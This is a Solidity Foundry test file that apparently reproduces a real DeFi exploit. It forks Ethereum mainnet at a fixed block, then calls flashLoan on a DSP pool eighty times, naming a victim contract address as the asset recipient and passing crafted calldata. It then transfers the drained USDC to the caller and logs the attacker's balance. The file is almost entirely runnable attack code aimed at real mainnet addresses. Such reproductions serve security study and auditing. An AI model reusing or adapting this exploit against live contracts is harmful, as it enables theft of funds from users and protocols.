// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../hackPoc.sol";
import "./interface.sol";
import "forge-std/console.sol";

interface DSPTrader {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

contract ContractsTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    DSPTrader dsp = DSPTrader(0x3058EF90929cb8180174D74C507176ccA6835D73);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address private victim = 0x28d949Fdfb5d9ea6B604fA6FEe3D6548ea779F17;

    function setUp() public {
        cheats.createSelectFork("ankr_mainnet", 16157842);
        cheats.deal(msg.sender, 100 ether);
    }

    function testAttack() public {
        bytes memory data = abi.encodePacked(
            abi.encode(address(this)),
            uint256(61336417),
            uint256(167813290),
            uint256(0)
        );
        for (uint256 i = 0; i < 80; i++) {
            dsp.flashLoan(0, 16_777_120, victim, data);
        }
        uint256 wad = USDC.balanceOf(address(this));
        USDC.transfer(msg.sender, wad);
        uint256 wad2 = USDC.balanceOf(msg.sender);
        console.log("attacker:", wad2);
    }

    fallback() external payable {}
}
